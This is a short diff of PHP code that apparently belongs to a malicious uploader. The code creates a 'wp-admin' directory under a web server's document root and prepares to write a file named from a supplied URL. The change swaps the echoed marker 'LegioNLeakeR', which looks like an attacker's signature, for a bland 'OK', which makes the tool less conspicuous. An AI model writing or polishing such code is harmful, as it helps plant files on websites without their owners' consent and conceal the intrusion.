@@ -17,14 +17,12 @@ function file_name($url)
 $test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
 if (!file_exists($test_dir)) {
   if (mkdir($test_dir)) {
-    
-    echo "LegioNLeakeR";
+    echo "OK";
   } else {
     echo "Fail Create-Folder";
   }
 } else {
- 
-  echo "LegioNLeakeR";
+  echo "OK";
 }
  
 $path_u = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/' . file_name($url);
